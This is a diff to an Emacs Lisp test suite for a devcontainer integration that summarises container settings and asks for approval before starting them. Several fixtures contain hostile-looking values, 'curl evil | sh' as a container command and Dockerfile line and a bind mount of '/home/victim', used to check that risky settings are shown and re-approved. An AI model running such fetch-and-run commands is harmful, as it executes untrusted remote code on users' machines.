@@ -77,6 +77,7 @@ DIR is the project, LOG the file the program writes its calls to."
                      process-environment))
             (mega--exe-cache (make-hash-table :test #'equal))
             (mega-container--attached nil)
+            (mega-container--starting nil)
             (mega-container--found (make-hash-table :test #'equal))
             (mega-container-engine 'auto)
             (mega-container-approved-file (expand-file-name "approved.eld" dir))
@@ -95,7 +96,22 @@ DIR is the project, LOG the file the program writes its calls to."
                   (lambda (name) (and (member name '("podman" "just"))
                                       (expand-file-name name bin)))))
          (let ((inhibit-message t))
-           ,@body)))))
+           (unwind-protect
+               (save-window-excursion ,@body)
+             (dolist (starting mega-container--starting)
+               (when (processp (cdr starting)) (delete-process (cdr starting))))
+             (when (get-buffer mega-container-log-buffer)
+               (kill-buffer mega-container-log-buffer))))))))
+
+(defun mega-container-test--up (dir)
+  "Start the container of the project at DIR and wait until that is over.
+Starting happens in the background; a test has to wait as a person would."
+  (mega-container-up)
+  (should (mega-test-wait-for (lambda () (not (assoc dir mega-container--starting))) 30)))
+
+(defun mega-container-test--shown ()
+  "What the window that shows a container being started says."
+  (mega-test-buffer-string mega-container-log-buffer))
 
 (defun mega-container-test--log (log)
   "The calls the fake container program received, one per element."
@@ -178,7 +194,52 @@ DIR is the project, LOG the file the program writes its calls to."
 (ert-deftest mega-container-what-needs-the-official-tool-is-noticed ()
   (dolist (key '(build dockerFile features dockerComposeFile))
     (should (equal (plist-get (mega-container-plan `((,key . "x")) "/p/") :unsupported)
-                   (list key)))))
+                   (list (symbol-name key))))))
+
+(ert-deftest mega-container-every-key-is-acted-on-ignored-on-purpose-or-refused ()
+  "A setting MEGA would silently skip might be the one that mattered."
+  (let ((plan (mega-container-plan
+               '((image . "a") (customizations . ((vscode . t))) (shutdownAction . "none")
+                 (frobnicate . t) (hostNetwork . t))
+               "/p/")))
+    ;; Known and harmless: nothing to say.
+    (should-not (plist-get plan :unsupported))
+    ;; Not known at all: named.
+    (should (equal (plist-get plan :unknown) '("frobnicate" "hostNetwork"))))
+  ;; No key belongs to two of the sets.
+  (should-not (seq-intersection mega-container-handled-keys mega-container-harmless-keys))
+  (should-not (seq-intersection mega-container-handled-keys mega-container-unsupported-keys))
+  (should-not (seq-intersection mega-container-harmless-keys mega-container-unsupported-keys)))
+
+(ert-deftest mega-container-mounts-and-ports-in-every-allowed-form ()
+  (let ((plan (mega-container-plan
+               '((image . "a")
+                 (mounts "source=cache,target=/cache,type=volume"
+                         ((source . "/data") (target . "/mnt/data") (type . "bind"))
+                         ((target . "/scratch"))
+                         ((source . "nowhere")))
+                 (forwardPorts 8080 "9090" "db:5432"))
+               "/p/")))
+    (should (equal (plist-get plan :mounts)
+                   '("source=cache,target=/cache,type=volume"
+                     "type=bind,source=/data,target=/mnt/data"
+                     "type=volume,target=/scratch")))
+    (should (equal (plist-get plan :ports) '("8080" "9090")))
+    ;; What cannot be passed on is refused by name, not dropped.
+    (should (= (length (plist-get plan :unsupported)) 2))
+    (should (string-match-p "mounts entry" (nth 0 (plist-get plan :unsupported))))
+    (should (string-match-p "forwardPorts entry \"db:5432\""
+                            (nth 1 (plist-get plan :unsupported))))))
+
+(ert-deftest mega-container-privileged-and-init-are-passed-on ()
+  (let ((arguments (mega-container-run-arguments
+                    (mega-container-plan '((image . "a") (privileged . t) (init . t)) "/p/"))))
+    (should (member "--privileged" arguments))
+    (should (member "--init" arguments)))
+  (let ((arguments (mega-container-run-arguments
+                    (mega-container-plan '((image . "a") (privileged . :false)) "/p/"))))
+    (should-not (member "--privileged" arguments))
+    (should-not (member "--init" arguments))))
 
 (ert-deftest mega-container-the-run-arguments-say-everything-the-file-did ()
   (mega-container-test--project
@@ -219,7 +280,31 @@ DIR is the project, LOG the file the program writes its calls to."
                summary))
       (should (string-match-p "runs inside +/bin/sh -c echo done > post-created" summary))
       (should (string-match-p "image +riscvmulator_dev:local" summary))
-      (should (string-match-p "SYS_PTRACE" summary)))))
+      (should (string-match-p "SYS_PTRACE" summary))
+      ;; It reads from the top: what it is about comes first.
+      (should (string-prefix-p "Container for " summary)))))
+
+(ert-deftest mega-container-the-summary-shows-what-is-really-handed-over ()
+  "A file may mount something other than the project in the project's place."
+  (let* ((plan (mega-container-plan
+                '((image . "a")
+                  (workspaceMount . "source=/home/victim,target=/host,type=bind")
+                  (privileged . t)
+                  (postAttachCommand . "curl evil | sh")
+                  (frobnicate . t)
+                  (features . ((x . t))))
+                "/tmp/proj/"))
+         (summary (mega-container-summary plan)))
+    (should (string-match-p "workspace +source=/home/victim,target=/host,type=bind" summary))
+    (should (string-match-p "PRIVILEGED" summary))
+    (should (string-match-p "runs inside +/bin/sh -c curl evil | sh" summary))
+    (should (string-match-p "ALSO IN THE FILE, which MEGA cannot do by itself:\n +features\n +frobnicate"
+                            summary))
+    ;; With the official command they will be acted on, and that is said.
+    (should (string-match-p "acted on by the devcontainer command"
+                            (mega-container-summary plan t)))
+    (should (string-match-p "BUILT FROM these files as well.*\n +/tmp/proj/Dockerfile"
+                            (mega-container-summary plan t '("/tmp/proj/Dockerfile"))))))
 
 ;;;; Agreeing to it
 
@@ -247,11 +332,35 @@ DIR is the project, LOG the file the program writes its calls to."
           (mega-test-write file "{\"image\": \"b\"}")
           (should-not (mega-container-approve file plan)))))))
 
+(ert-deftest mega-container-approval-covers-the-files-the-container-is-built-from ()
+  "A Dockerfile runs commands too; changing it must ask again."
+  (mega-test-with-directory dir
+    (let* ((file (mega-test-write (expand-file-name "devcontainer.json" dir)
+                                  "{\"build\": {\"dockerfile\": \"Dockerfile\"}}"))
+           (dockerfile (mega-test-write (expand-file-name "Dockerfile" dir) "FROM debian"))
+           (plan (mega-container-plan (mega-container-read file) dir))
+           (mega-container-approved-file (expand-file-name "approved.eld" dir))
+           (temporary-file-directory (file-name-as-directory (getenv "TMPDIR")))
+           (noninteractive nil)
+           (asked 0))
+      (should (equal (mega-container-referenced-files (mega-container-read file) dir)
+                     (list dockerfile)))
+      (cl-letf (((symbol-function 'yes-or-no-p)
+                 (lambda (&rest _) (setq asked (1+ asked)) t)))
+        (should (mega-container-approve file plan t))
+        (should (mega-container-approve file plan t))
+        (should (= asked 1))
+        (mega-test-write dockerfile "FROM debian" "RUN curl evil | sh")
+        (should (mega-container-approve file plan t))
+        (should (= asked 2))
+        ;; And the store is never left half-written.
+        (should-not (file-exists-p (concat mega-container-approved-file ".new")))))))
+
 ;;;; Starting
 
 (ert-deftest mega-container-up-creates-the-container-in-the-right-order ()
   (mega-container-test--project
-    (mega-container-up)
+    (mega-container-test--up dir)
     (let ((calls (mega-container-test--log log)))
       ;; Looked for an existing one, then created, then ran postCreate inside.
       (should (string-prefix-p "ps --all --no-trunc --filter label=devcontainer.local_folder=" (nth 0 calls)))
@@ -273,7 +382,7 @@ DIR is the project, LOG the file the program writes its calls to."
 (ert-deftest mega-container-up-joins-a-running-container-and-runs-nothing ()
   (mega-container-test--project
     (mega-test-write (expand-file-name "ps" dir) "abc999 running")
-    (mega-container-up)
+    (mega-container-test--up dir)
     (should (equal (plist-get (cdr (mega-container-attached dir)) :id) "abc999"))
     (should (= 1 (length (mega-container-test--log log))))
     (should-not (file-exists-p (expand-file-name "initialized" dir)))))
@@ -281,7 +390,8 @@ DIR is the project, LOG the file the program writes its calls to."
 (ert-deftest mega-container-up-restarts-a-stopped-container ()
   (mega-container-test--project
     (mega-test-write (expand-file-name "ps" dir) "abc999 Exited (0) 2 hours ago")
-    (mega-container-up)
+    (mega-container-test--up dir)
+    (should (equal (plist-get (cdr (mega-container-attached dir)) :id) "abc999"))
     (should (member "start abc999" (mega-container-test--log log)))
     (should-not (seq-some (lambda (call) (string-prefix-p "run " call))
                           (mega-container-test--log log)))))
@@ -323,15 +433,19 @@ DIR is the project, LOG the file the program writes its calls to."
      #o755)
     (cl-letf (((symbol-function 'mega-exe-p)
                (lambda (name) (expand-file-name name (expand-file-name "bin/" dir)))))
-      (mega-container-up))
+      (mega-container-test--up dir))
     (let ((attached (cdr (mega-container-attached dir))))
       (should (equal (plist-get attached :id) "cli777"))
       (should (equal (plist-get attached :user) "vscode"))
       (should (equal (plist-get attached :folder) "/workspaces/x")))
-    (should (string-match-p "\\`up --workspace-folder .* --docker-path podman"
-                            (with-temp-buffer
-                              (insert-file-contents (expand-file-name "devcontainer-args" dir))
-                              (buffer-string))))
+    (let ((arguments (with-temp-buffer
+                       (insert-file-contents (expand-file-name "devcontainer-args" dir))
+                       (buffer-string))))
+      (should (string-match-p "\\`up --workspace-folder .* --docker-path podman" arguments))
+      ;; It is told which file was agreed to, wherever that file is.
+      (should (string-match-p
+               (concat "--config " (regexp-quote (mega-container-config-file dir)))
+               arguments)))
     ;; MEGA itself created nothing.
     (should-not (mega-container-test--log log))))
 
@@ -344,9 +458,123 @@ DIR is the project, LOG the file the program writes its calls to."
      #o755)
     (cl-letf (((symbol-function 'mega-exe-p)
                (lambda (name) (expand-file-name name (expand-file-name "bin/" dir)))))
-      (let ((err (should-error (mega-container-up) :type 'user-error)))
-        (should (string-match-p "image not found" (cadr err)))))
-    (should-not (mega-container-attached dir))))
+      (mega-container-test--up dir))
+    (should-not (mega-container-attached dir))
+    ;; What it said is on screen, and so is that nothing was started.
+    (should (string-match-p "image not found" (mega-container-test--shown)))
+    (should (string-match-p "Not started" (mega-container-test--shown)))))
+
+;;;; Starting does not hold Emacs
+
+(defmacro mega-container-test--slow-start (&rest body)
+  "Run BODY in a project whose first step of starting takes a second."
+  (declare (indent 0))
+  `(mega-container-test--project
+     (set-file-modes (mega-test-write (expand-file-name "bin/just" dir)
+                                      "#!/bin/sh" "echo fetching the image..."
+                                      "sleep 1" "echo \"$@\" > initialized" "")
+                     #o755)
+     ,@body))
+
+(ert-deftest mega-container-up-returns-at-once-and-finishes-later ()
+  (mega-container-test--slow-start
+    (let ((start (float-time)))
+      (mega-container-up)
+      (should (< (- (float-time) start) 0.5)))
+    ;; Emacs is yours again; the container is not there yet.
+    (should (assoc dir mega-container--starting))
+    (should-not (mega-container-attached dir))
+    ;; What the step prints is shown as it comes, not at the end.
+    (should (mega-test-wait-for
+             (lambda () (string-match-p "fetching the image" (mega-container-test--shown)))
+             10))
+    (should (assoc dir mega-container--starting))
+    ;; A second request meanwhile is refused, not queued.
+    (should-error (mega-container-up) :type 'user-error)
+    (should (mega-test-wait-for (lambda () (mega-container-attached dir)) 30))
+    (should-not (assoc dir mega-container--starting))
+    (should (string-match-p "now run in its container" (mega-container-test--shown)))))
+
+(ert-deftest mega-container-starting-can-be-given-up ()
+  (mega-container-test--slow-start
+    (mega-container-up)
+    (should (mega-test-wait-for
+             (lambda () (processp (cdr (assoc dir mega-container--starting)))) 10))
+    (let ((process (cdr (assoc dir mega-container--starting))))
+      (mega-container-stop)
+      (should-not (assoc dir mega-container--starting))
+      (should (mega-test-wait-for (lambda () (not (process-live-p process))) 10)))
+    (accept-process-output nil 0.3)
+    ;; Nothing after the step that was running: no container was made.
+    (should-not (mega-container-attached dir))
+    (should-not (seq-some (lambda (call) (string-prefix-p "run " call))
+                          (mega-container-test--log log)))
+    (should (string-match-p "Given up" (mega-container-test--shown)))))
+
+(ert-deftest mega-container-a-step-that-fails-stops-the-rest ()
+  (mega-container-test--project
+    (set-file-modes (mega-test-write (expand-file-name "bin/just" dir)
+                                     "#!/bin/sh" "echo 'no such recipe' >&2" "exit 2" "")
+                    #o755)
+    (mega-container-test--up dir)
+    (should-not (mega-container-attached dir))
+    (should-not (seq-some (lambda (call) (string-prefix-p "run " call))
+                          (mega-container-test--log log)))
+    ;; Why, in the program's own words, error output included.
+    (should (string-match-p "no such recipe" (mega-container-test--shown)))
+    (should (string-match-p "Not started: .on this machine: just ensure-dev-image-exists. failed"
+                            (mega-container-test--shown)))))
+
+(ert-deftest mega-container-a-setting-mega-does-not-know-is-refused-by-name ()
+  (mega-container-test--project
+    (mega-test-write (expand-file-name ".devcontainer/devcontainer.json" dir)
+                     "{\"image\": \"a\", \"hostNetwork\": true, \"customizations\": {}}")
+    (let ((err (should-error (mega-container-up) :type 'user-error)))
+      (should (string-match-p "hostNetwork" (cadr err)))
+      (should-not (string-match-p "customizations" (cadr err))))
+    (should-not (mega-container-test--log log))
+    (should-not mega-container--starting)))
+
+(ert-deftest mega-container-what-the-container-s-own-environment-is-is-asked-of-it ()
+  "${containerEnv:PATH} can only be filled in once the container exists."
+  (mega-container-test--project
+    (mega-test-write (expand-file-name ".devcontainer/devcontainer.json" dir)
+                     "{\"image\": \"a\","
+                     " \"remoteEnv\": {\"PATH\": \"${containerEnv:PATH}:/opt/tool/bin\","
+                     "                \"MISSING\": \"${containerEnv:MEGA_TEST_UNSET:fallback}\","
+                     "                \"PLAIN\": \"as written\"}}")
+    (mega-container-test--up dir)
+    (let ((environment (plist-get (cdr (mega-container-attached dir)) :env)))
+      ;; The stand-in runs `env' here, so "inside" is this process's own.
+      (should (member (concat "PATH=" (getenv "PATH") ":/opt/tool/bin") environment))
+      (should (member "MISSING=fallback" environment))
+      (should (member "PLAIN=as written" environment))
+      (should-not (seq-some (lambda (setting) (string-search "${" setting)) environment)))))
+
+(ert-deftest mega-container-commands-of-the-file-run-with-the-environment-filled-in ()
+  "Found on a real container: with PATH still reading ${containerEnv:PATH},
+a command the file gives as a list, `sh' and its arguments, is not found."
+  (mega-container-test--project
+    (mega-test-write (expand-file-name ".devcontainer/devcontainer.json" dir)
+                     "{\"image\": \"a\","
+                     " \"remoteEnv\": {\"PATH\": \"${containerEnv:PATH}:/opt/tool/bin\"},"
+                     " \"onCreateCommand\": \"echo created\","
+                     " \"postStartCommand\": [\"sh\", \"-c\", \"echo started\"]}")
+    (mega-container-test--up dir)
+    (should (mega-container-attached dir))
+    (let* ((calls (mega-container-test--log log))
+           (asked (seq-position calls nil (lambda (call _) (string-match-p " env\\'" call))))
+           (commands (seq-filter (lambda (call) (string-match-p "echo \\(?:created\\|started\\)" call))
+                                 calls)))
+      ;; The container is asked for its environment once, and before
+      ;; anything of the file's runs in it.
+      (should asked)
+      (should (= (length commands) 2))
+      (dolist (command commands)
+        (should (> (seq-position calls command) asked))
+        (should (string-search (concat "--env PATH=" (getenv "PATH") ":/opt/tool/bin")
+                               command))
+        (should-not (string-search "${containerEnv" command))))))
 
 ;;;; Being attached
 
@@ -370,7 +598,39 @@ DIR is the project, LOG the file the program writes its calls to."
       ;; Not the project's file: it exists only in the container.
       (should (equal (mega-container-to-host "/usr/local/cargo/registry/x/lib.rs" entry)
                      "/podman:appdev@cid123:/usr/local/cargo/registry/x/lib.rs"))
-      (should (equal (mega-container-to-host "src/a.rs" entry) "src/a.rs")))))
+      (should (equal (mega-container-to-host "src/a.rs" entry) "src/a.rs"))
+      ;; The workspace itself, with and without its final slash.
+      (should (equal (mega-container-to-host "/app" entry) dir))
+      (should (equal (mega-container-to-host "/app/" entry) dir))
+      ;; A sibling whose name merely starts the same is not the workspace.
+      (should (equal (mega-container-to-host "/application/x" entry)
+                     "/podman:appdev@cid123:/application/x")))))
+
+(ert-deftest mega-container-what-a-caller-asks-for-reaches-the-program-inside ()
+  (mega-container-test--attached
+    (let ((attached (cdr (mega-container-attached dir))))
+      (let ((mega-exec-environment '("DEBUGINFOD_URLS=")))
+        (should (equal (mega-container--exec-arguments attached "/app")
+                       '("exec" "--interactive" "--user" "appdev" "--workdir" "/app"
+                         "--env" "A=1" "--env" "DEBUGINFOD_URLS=" "cid123"))))
+      (let ((mega-exec-terminal t))
+        (should (member "--tty" (mega-container--exec-arguments attached "/app"))))
+      (should-not (member "--tty" (mega-container--exec-arguments attached "/app"))))
+    ;; The context says which container it is, for what is remembered about it.
+    (should (equal (mega-exec-context-key dir) "cid123"))))
+
+(ert-deftest mega-container-not-being-able-to-ask-is-not-an-answer ()
+  (mega-container-test--attached
+    (let ((answers '((:status nil :stopped timeout) (:status 0))))
+      (cl-letf (((symbol-function 'mega-container--engine)
+                 (lambda (&rest _) (pop answers))))
+        ;; The first time the container did not answer in time...
+        (should-not (mega-exec-find "cargo" dir))
+        ;; ...which was not "cargo is not there".
+        (should (mega-exec-find "cargo" dir))))
+    ;; And what is remembered can be forgotten.
+    (let ((inhibit-message t)) (mega-forget-executables))
+    (should (= (hash-table-count mega-container--found) 0))))
 
 (ert-deftest mega-container-tools-of-an-attached-project-run-inside ()
   (mega-container-test--attached
@@ -414,6 +674,34 @@ DIR is the project, LOG the file the program writes its calls to."
                      '("/somewhere/else/x.rs")))
       (should (equal (mega-container--uri-to-path "/app/src/a.rs") "/app/src/a.rs")))))
 
+(ert-deftest mega-container-names-are-translated-for-the-server-that-said-them ()
+  "Emacs handles a server's messages on its own time, in a buffer of no
+project.  Whose container a name belongs to is the server's affair, not
+that of wherever the cursor happens to be."
+  (mega-container-test--attached
+    (let ((inside-server (list 'server-of-the-attached-project))
+          (host-server (list 'server-of-another-project))
+          (file (expand-file-name "src/a.rs" dir))
+          (heard (lambda (_connection path) (mega-container--uri-to-path path))))
+      (let ((default-directory dir))
+        (mega-container--note-server inside-server))
+      (let ((default-directory "/home/u/other/"))
+        (mega-container--note-server host-server))
+      ;; Cursor in a buffer of no project: the attached project's server
+      ;; reports a problem in one of its files.
+      (let ((default-directory "/somewhere/else/"))
+        (should (equal (mega-container--receive heard inside-server "/app/src/a.rs")
+                       file)))
+      ;; Cursor in the attached project: a server of another project, on
+      ;; this machine, names a file.  It is that file, not one in a container.
+      (let ((default-directory dir))
+        (should (equal (mega-container--receive heard host-server "/home/u/other/y.rs")
+                       "/home/u/other/y.rs")))
+      ;; A connection that is no language server at all is left alone.
+      (let ((default-directory "/somewhere/else/"))
+        (should (equal (mega-container--receive heard (list 'something-else) "/app/x")
+                       "/app/x"))))))
+
 (ert-deftest mega-container-the-modeline-says-when-tools-run-in-a-container ()
   (mega-container-test--attached
     (should (equal (mega-container--modeline) " [box:box]"))
@@ -445,6 +733,7 @@ DIR is the project, LOG the file the program writes its calls to."
     (let ((temporary-file-directory (file-name-as-directory (getenv "TMPDIR"))))
       (cl-letf (((symbol-function 'yes-or-no-p) (lambda (&rest _) t)))
         (mega-container-rebuild)))
+    (should (mega-test-wait-for (lambda () (not (assoc dir mega-container--starting))) 30))
     (should (member "rm --force old111" (mega-container-test--log log)))
     ;; Never a volume.
     (should-not (seq-some (lambda (call) (string-match-p "volume\\|--volumes\\|-v\\b" call))
